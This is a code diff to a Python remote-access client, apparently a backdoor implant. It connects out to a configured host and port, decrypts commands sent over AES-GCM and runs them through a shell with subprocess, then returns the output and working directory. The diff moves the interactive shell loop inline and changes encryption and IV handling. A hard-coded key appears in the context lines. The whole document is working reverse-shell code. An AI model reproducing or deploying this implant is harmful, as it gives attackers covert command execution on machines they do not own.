@@ -29,29 +29,6 @@ FB_KEY    = '82e672ae054aa4de6f042c888111686a'
 # python -c "import binascii, os; print(binascii.hexlify(os.urandom(16)))"
 
 
-def shell(sock, dh_key):
-    sock.send(crypto.AES_encrypt(os.getcwd() + "|" + "", dh_key))
-
-    while True:
-        results = ""
-        cmd = crypto.AES_decrypt(sock.recv(1024), dh_key)
-
-        if cmd == "exit":
-            break
-        if cmd.split(" ")[0] == "cd":
-            try:
-                os.chdir(cmd.split(" ")[1])
-            except Exception:
-                pass
-        else:
-            print("Running: {}".format(cmd))
-            results = subprocess.Popen(cmd, shell=True,
-                      stdout=subprocess.PIPE, stderr=subprocess.PIPE,
-                      stdin=subprocess.PIPE)
-            results = results.stdout.read() + results.stderr.read()
-        sock.send(crypto.AES_encrypt(os.getcwd() + "|" + results, dh_key))
-
-
 def main():
     s = socket.socket()
     s.connect((HOST, PORT))
@@ -66,10 +43,10 @@ def main():
         #data = s.recv(1024)
         #data = crypto.AES_decrypt(data, dh_key)
         data = crypto.recvGCM(s, GCM)
-        IV += 1
-        
+
         if not data:
             continue
+        IV += 1
 
         # seperate prompt into command and action
         cmd, _, action = data.partition(' ')
@@ -134,7 +111,28 @@ def main():
             #s.send(crypto.AES_encrypt(results, dh_key))
 
         elif cmd == 'shell':
-            shell(s, dh_key)
+            crypto.sendGCM(s, GCM, IV, os.getcwd() + "|" + "")
+
+            while True:
+                results = ""
+                cmd = crypto.recvGCM(s, GCM)
+                if not cmd:
+                    continue
+                IV += 1
+
+                if cmd == "exit":
+                    break
+                if cmd.split(" ")[0] == "cd":
+                    try:
+                        os.chdir(cmd.split(" ")[1])
+                    except Exception:
+                        pass
+                else:
+                    results = subprocess.Popen(cmd, shell=True,
+                                               stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                                               stdin=subprocess.PIPE)
+                    results = results.stdout.read() + results.stderr.read()
+                crypto.sendGCM(s, GCM, IV, os.getcwd() + "|" + results)
 
 
 if __name__ == '__main__':
